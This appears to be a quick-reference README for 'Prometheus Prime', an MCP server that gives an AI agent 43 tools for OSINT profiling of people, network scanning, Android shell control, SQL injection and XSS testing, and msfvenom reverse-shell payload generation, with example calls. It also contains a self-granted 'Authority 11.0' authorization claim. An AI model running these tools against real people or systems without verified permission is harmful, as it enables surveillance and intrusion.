# 🎯 PROMETHEUS PRIME - QUICK REFERENCE

**Authority Level: 11.0** | **43 MCP Tools** | **Full Offensive/Defensive**

---

## ⚡ FAST ACCESS

### Launch MCP Server
```bash
P:\ECHO_PRIME\MLS_CLEAN\PRODUCTION\GATEWAYS\PROMETHEUS_PRIME\LAUNCH_PROMETHEUS_MCP.bat
```

### Launch HTTP API
```bash
P:\ECHO_PRIME\MLS_CLEAN\PRODUCTION\GATEWAYS\PROMETHEUS_PRIME\LAUNCH_OSINT_API.bat
```

---

## 📊 TOOL CATEGORIES (43 Total)

### 🔍 OSINT (6)
- `prom_phone_lookup` - Reverse phone
- `prom_social_search` - Reddit/social
- `prom_domain_lookup` - WHOIS/DNS
- `prom_email_analyze` - Breach check
- `prom_ip_analyze` - Geolocation/abuse
- `prom_osint_full` - Complete report

### 🌐 NETWORK (5)
- `prom_port_scan` - Multi-threaded scanner
- `prom_nmap_scan` - Nmap wrapper
- `prom_vulnerability_scan` - Auto vuln detect
- `prom_subnet_scan` - Host discovery
- `prom_service_banner` - Fingerprinting

### 📱 MOBILE (8)
**Android:**
- `prom_android_devices` - List devices
- `prom_android_info` - Device info
- `prom_android_shell` - Execute commands
- `prom_android_screenshot` - Screenshot
- `prom_android_apps` - List apps

**iOS:**
- `prom_ios_devices` - List devices
- `prom_ios_info` - Device info
- `prom_ios_screenshot` - Screenshot

### 🌐 WEB (8)
- `prom_web_headers` - Security headers
- `prom_sql_injection` - SQL testing
- `prom_xss_test` - XSS testing
- `prom_dir_bruteforce` - Directory enum
- `prom_web_crawl` - Link discovery
- `prom_ssl_scan` - TLS analysis
- `prom_tech_detect` - Tech stack
- `prom_web_comprehensive` - Full scan

### 💥 EXPLOIT (5)
- `prom_search_exploits` - Exploit-DB search
- `prom_generate_payload` - msfvenom
- `prom_list_payloads` - List payloads
- `prom_pattern_create` - Buffer overflow
- `prom_msf_search` - MSF modules

### 🔧 UTILITY (2)
- `prom_health` - System status
- `prom_healing_stats` - Phoenix metrics

---

## 🚀 COMMON OPERATIONS

### OSINT Investigation
```python
# Phone lookup
prom_phone_lookup(phone="+15555551234")

# Full OSINT
prom_osint_full(
    name="John Doe",
    phone="+15555551234",
    email="test@example.com",
    location="Texas"
)
```

### Network Reconnaissance
```python
# Quick port scan
prom_port_scan(target="192.168.1.1")

# Full Nmap scan
prom_nmap_scan(target="192.168.1.1", scan_type="full")

# Subnet discovery
prom_subnet_scan(subnet="192.168.1.0/24")
```

### Web Security Testing
```python
# Comprehensive assessment
prom_web_comprehensive(url="https://target.com")

# SQL injection test
prom_sql_injection(url="https://target.com/page")

# XSS test
prom_xss_test(url="https://target.com/search")
```

### Mobile Device Control
```python
# List Android devices
prom_android_devices()

# Execute shell command
prom_android_shell(command="pm list packages")

# Capture screenshot
prom_android_screenshot(output_path="screen.png")
```

### Exploitation
```python
# Search exploits
prom_search_exploits(query="windows smb")

# Generate payload
prom_generate_payload(
    payload_type="windows/meterpreter/reverse_tcp",
    lhost="192.168.1.10",
    lport=4444
)
```

---

## 🔑 REQUIRED TOOLS

### Must Have
- **Python 3.10+** - `H:\Tools\python.exe`
- **Nmap** - Network scanning
- **ADB** - Android control

### Optional
- **libimobiledevice** - iOS control
- **Metasploit** - Exploitation
- **SearchSploit** - Exploit database

---

## 📡 API ENDPOINTS (HTTP Server)

**Base URL:** `http://localhost:8343`

### OSINT
- POST `/api/phone/lookup` - Phone intel
- POST `/api/social/search` - Social OSINT
- POST `/api/domain/lookup` - Domain intel
- POST `/api/email/analyze` - Email intel
- POST `/api/ip/analyze` - IP intel
- POST `/api/osint/full` - Complete OSINT

### Status
- GET `/api/health` - Health check
- GET `/api/keys/status` - API key status

---

## ⚠️ SECURITY NOTICE

**AUTHORIZED USE ONLY**

All offensive capabilities require:
- Written authorization
- Defined scope
- Legal compliance
- Ethical guidelines

**Commander Bob (Authority 11.0)** - Full authorization for legitimate penetration testing and security research.

---

## 📞 QUICK EXAMPLES

### Phone Intel
```bash
# MCP
prom_phone_lookup(phone="+15555551234", use_cache=true)

# HTTP
curl -X POST http://localhost:8343/api/phone/lookup \
  -H "Content-Type: application/json" \
  -d '{"phone":"+15555551234"}'
```

### Port Scan
```bash
# MCP
prom_port_scan(target="192.168.1.1", timeout=1.0)
```

### Web Security
```bash
# MCP
prom_web_comprehensive(url="https://target.com")

# SQL Injection
prom_sql_injection(url="https://target.com/page", param="id")
```

---

## 🎯 FILE STRUCTURE

```
PROMETHEUS_PRIME/
├── prometheus_prime_mcp.py          # Complete MCP server (43 tools)
├── osint_api_server.py             # HTTP API (13 endpoints)
├── phone_intelligence.py            # Phone OSINT
├── social_osint.py                 # Social media OSINT
├── domain_intelligence.py          # Domain/WHOIS
├── email_intelligence.py           # Email/breach checking
├── ip_intelligence.py              # IP intelligence
├── network_security.py             # Network scanning
├── mobile_control.py               # iOS/Android control
├── web_security.py                 # Web security testing
├── exploitation_framework.py       # Metasploit integration
├── gs343_gateway.py                # Phoenix healing
├── mls_config.json                 # MLS registration
├── COMPLETE_STATUS.md              # Full documentation
└── QUICK_REFERENCE.md              # This file
```

---

**PROMETHEUS PRIME v3.0.0**  
**Full Spectrum Security Operations**  
**Authority Level 11.0**
